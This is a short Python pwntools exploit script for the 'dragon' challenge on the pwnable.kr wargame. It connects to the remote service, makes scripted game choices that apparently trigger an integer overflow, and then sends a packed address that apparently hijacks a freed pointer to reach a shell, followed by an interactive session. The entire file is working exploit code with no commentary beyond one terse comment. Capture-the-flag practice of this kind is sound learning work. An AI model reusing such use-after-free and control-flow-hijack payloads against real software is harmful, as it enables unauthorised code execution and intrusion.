#!/usr/bin/env python3

from pwn import *

exe = ELF("./dragon")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript='b *0x080488c0')
    else:
        r = remote('pwnable.kr',9004)

    return r


def main():
    r = conn()

    r.sendlineafter(b'[ 2 ] Knight', b'2') # skip on baby
    r.sendlineafter(b'But You Lose 20 HP.', b'2')
    
    r.sendlineafter(b'[ 2 ] Knight', b'1')

    for _ in range(4):
        r.sendline(b'3\n3\n2')


    r.sendline(p32(0x8048dbf))

    r.interactive()


if __name__ == "__main__":
    main()
